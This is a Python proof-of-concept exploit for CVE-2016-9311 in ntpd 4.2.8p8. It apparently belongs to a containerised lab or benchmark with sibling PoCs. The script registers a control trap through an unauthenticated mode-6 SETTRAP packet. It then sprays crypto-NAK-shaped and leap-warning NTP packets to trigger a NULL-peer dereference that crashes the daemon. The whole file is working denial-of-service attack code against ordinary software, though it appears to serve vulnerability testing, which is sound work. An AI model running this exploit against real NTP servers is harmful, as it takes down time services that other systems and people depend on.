#!/usr/bin/env python3
"""
CVE-2016-9311 - ntpd report_event() NULL pointer dereference (DoS).

ntpd before 4.2.8p9 (here: 4.2.8p8) crashes when the TRAP SERVICE is enabled
and a PEER_EVENT is raised with a NULL peer. In ntpd/ntp_control.c,
report_event() returns early unless `num_ctl_traps > 0`; once a trap exists it
reaches:

        } else {
                INSIST(peer != NULL);            // p8: ISC assert / NULL guard
                rpkt.associd = htons(peer->associd);   // NULL deref

p9 adds `if ((err & PEER_EVENT) && !peer) return;` (Bug 3119). The bug comment
names the two NULL-peer call sites: an unsolicited crypto-NAK, and the leap
second alarm arming `report_event(PEVNT_ARMED, sys_peer, NULL)` while there is
no system peer.

This PoC:
  1. Registers a control trap with a mode-6 CTL_OP_SETTRAP packet. set_trap is
     dispatched NOAUTH in p8 (control_codes[]), so no auth is needed. (The
     bundled ntp.conf ALSO carries a static `trap` line, so num_ctl_traps > 0
     from boot regardless.)
  2. Fires the candidate NULL-peer PEER_EVENT triggers reachable in a
     --without-crypto build: leap-warning (LI=01/10) server packets to advance
     the leap state machine toward PEVNT_ARMED while sys_peer is still NULL, and
     crypto-NAK-shaped packets (effective only if the build has Autokey).

argv[1]=host argv[2]=port, like the sibling PoCs.
"""

import socket
import struct
import sys
import time

# --- NTP mode-6 control header ---
#   byte0: LI(2) VN(3) MODE(3)  -> VN=2, MODE=6 => 0x16
#   byte1: R E M opcode(5)
LI_VN_MODE_CTRL = 0x16
CTL_OP_SETTRAP = 0x06    # set a control trap (NOAUTH in 4.2.8p8)
CTL_OP_ASYNCMSG = 0x1f


def build_mode6(opcode: int, data: bytes = b"", seq: int = 1, assoc: int = 0) -> bytes:
    """Build a mode-6 control packet for the given opcode."""
    count = len(data)
    hdr = struct.pack(">BBHHHHH", LI_VN_MODE_CTRL, opcode, seq, 0, assoc, 0, count)
    pkt = hdr + data
    while len(pkt) % 4:
        pkt += b"\x00"
    return pkt


def build_mode4(leap: int = 1, stratum: int = 1) -> bytes:
    """Build a mode-4 (server) NTP reply carrying a leap-warning indicator.

    leap=1 -> 'last minute has 61 seconds' (insert), leap=2 -> delete. A client
    that records a *dynamic* leap warning can later hit PEVNT_ARMED while no
    system peer is selected yet.
    """
    li_vn_mode = (leap << 6) | (4 << 3) | 4   # LI=leap, VN=4, MODE=4 (server)
    poll = 6
    precision = -20  # ~1us, signed log2 precision
    now = int(time.time()) + 2208988800       # NTP epoch
    root_delay = 0
    root_disp = 0
    refid = 0x7F7F0101                          # reference id
    ref_ts = (now - 1) << 32
    orig_ts = 0
    recv_ts = now << 32
    xmit_ts = now << 32
    return struct.pack(
        ">BBBbIIIQQQQ",
        li_vn_mode, stratum, poll, precision,
        root_delay, root_disp, refid,
        ref_ts, orig_ts, recv_ts, xmit_ts,
    )


def build_crypto_nak(assoc_org_lo: int = 0) -> bytes:
    """Mode-4 server packet + 4 zero bytes => crypto-NAK shape (keyid==0).

    Only effective if the target was built with Autokey/OpenSSL (FLAG_SKEY).
    Included for completeness; a --without-crypto build ignores it.
    """
    return build_mode4(leap=0, stratum=1) + b"\x00\x00\x00\x00"


def sendto(s: socket.socket, pkt: bytes, host: str, port: int, label: str) -> None:
    try:
        s.sendto(pkt, (host, port))
        print(f"[+] sent {label} ({len(pkt)} bytes)")
        try:
            resp, _ = s.recvfrom(4096)
            print(f"    <- {len(resp)} byte reply (server alive)")
        except socket.timeout:
            print("    <- no reply (timeout / possibly crashed)")
    except OSError as exc:  # noqa: BLE001
        print(f"    !! send error: {exc}")


def fire(host: str, port: int) -> None:
    print(f"[*] CVE-2016-9311 PoC -> {host}:{port}/udp (report_event NULL deref)")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1.5)

    # 1) Register a control trap (NOAUTH in p8). Belt-and-suspenders with the
    #    static `trap` directive in ntp.conf.
    sendto(s, build_mode6(CTL_OP_SETTRAP, seq=1),
           host, port, "mode-6 CTL_OP_SETTRAP (register trap)")
    time.sleep(0.3)

    # 2) Crypto-NAK-shaped server packets (effective only with Autokey build).
    for i in range(3):
        sendto(s, build_crypto_nak(), host, port, f"crypto-NAK-shape #{i}")
        time.sleep(0.2)

    # 3) Leap-warning server packets: drive the dynamic-leap state machine
    #    toward PEVNT_ARMED(sys_peer==NULL). Spray both insert and delete
    #    indications repeatedly to cross the LSPROX_SCHEDULE threshold while no
    #    system peer is selected.
    for rnd in range(40):
        leap = 1 if (rnd % 2 == 0) else 2
        sendto(s, build_mode4(leap=leap, stratum=1),
               host, port, f"leap-warning LI={leap} #{rnd}")
        time.sleep(0.1)

    s.close()
    print("[*] all packets sent; check `docker logs` for AddressSanitizer/SIGSEGV/INSIST")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 123
    fire(host, port)
